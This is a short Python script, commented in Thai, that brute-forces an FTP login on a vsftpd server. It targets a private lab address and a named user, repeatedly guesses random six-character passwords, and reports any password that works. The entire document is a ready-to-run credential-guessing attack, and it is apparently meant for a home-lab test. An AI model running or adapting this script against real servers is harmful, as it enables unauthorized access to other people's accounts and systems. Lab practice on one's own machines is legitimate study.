import ftplib
import random
import string
import time
import socket

# --- ตั้งค่าเป้าหมาย ---
TARGET_IP = '192.168.122.109' # IP ของเครื่องที่ลง vsftpd ไว้
TARGET_PORT = 21              # FTP ปกติใช้ Port 21 (ไม่ใช่ 22 เหมือน SSH)
USERNAME = 'fruitto'
MAX_ATTEMPTS = 20             # จำนวนรอบที่จะยิงทดสอบ

# ฟังก์ชันสุ่มรหัสผ่าน (ใช้ Logic เดิม)
def generate_random_password(length=8):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def ftp_brute_force():
    print(f"[*] Starting FTP Brute Force on {USERNAME}@{TARGET_IP}...")

    for i in range(1, MAX_ATTEMPTS + 1):
        # สุ่มรหัสผ่านใหม่ทุกรอบ
        password_guess = generate_random_password(length=6)

        ftp = ftplib.FTP()

        try:
            print(f"[{i}/{MAX_ATTEMPTS}] Trying password: {password_guess}", end='\r')

            # 1. เชื่อมต่อ (Connect)
            ftp.connect(TARGET_IP, TARGET_PORT, timeout=5)

            # 2. พยายามล็อกอิน (Login) -> จุดที่จะเกิด Error 530 ถ้าผิด
            ftp.login(user=USERNAME, passwd=password_guess)

            # ถ้าบรรทัดนี้ทำงานได้ แสดงว่ารหัสถูก!
            print(f"\n[+] SUCCESS! Password found: {password_guess}")

            # ลองรันคำสั่ง pwd เพื่อยืนยัน (Optional)
            print(f"Current Directory: {ftp.pwd()}")

            ftp.quit() # ออกจากระบบอย่างถูกต้อง
            break      # จบลูปทันทีที่เจอ

        except ftplib.error_perm as e:
            # error_perm คือ Permission Error (เช่น 530 Login incorrect)
            # นี่คือ case ปกติของการ Brute force
            # print(f"\n[-] Failed: {e}") # เปิดคอมเมนต์ถ้าอยากเห็น Error code ชัดๆ
            try:
                ftp.quit() # พยายามตัดการเชื่อมต่อให้สะอาด
            except:
                pass

        except (socket.error, EOFError) as e:
            print(f"\n[!] Connection Error: {e} (Server might be blocking or down)")
            break

        except Exception as e:
            print(f"\n[!] Unexpected Error: {e}")
            break

        finally:
            # ปิด Connection เสมอ (ถ้ายังไม่ปิด) เพื่อไม่ให้ Socket ค้าง
            try:
                ftp.close()
            except:
                pass

            # หน่วงเวลาเล็กน้อย (สำคัญมากสำหรับ FTP เพราะ connection สร้างช้ากว่า UDP)
            time.sleep(0.5)

    print("\n[*] Test Finished.")

if __name__ == "__main__":
    ftp_brute_force()